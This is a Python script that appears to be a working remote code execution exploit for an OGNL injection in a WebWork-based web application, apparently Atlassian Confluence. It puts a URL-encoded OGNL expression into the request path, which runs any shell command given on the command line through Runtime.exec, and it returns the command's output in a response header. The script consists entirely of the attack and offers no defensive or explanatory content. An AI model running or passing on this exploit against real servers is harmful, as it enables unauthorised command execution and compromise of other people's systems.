import argparse
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings()

def exploit(target, cmd):
    payload = f'''/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{urllib.parse.quote(cmd)}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'''

    r = requests.get(target + payload, verify=False, allow_redirects=False)
    if(r.status_code == 302 and 'X-Cmd-Response' in r.headers):
        print(r.headers['X-Cmd-Response'])
    else:
        print("Exploit failed to execute")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-c', '--cmd', help='Command to execute')

    args = parser.parse_args()

    if (args.url and args.cmd):
        exploit(args.url, args.cmd) 
    else:
        print("Please specify the target URL and command")
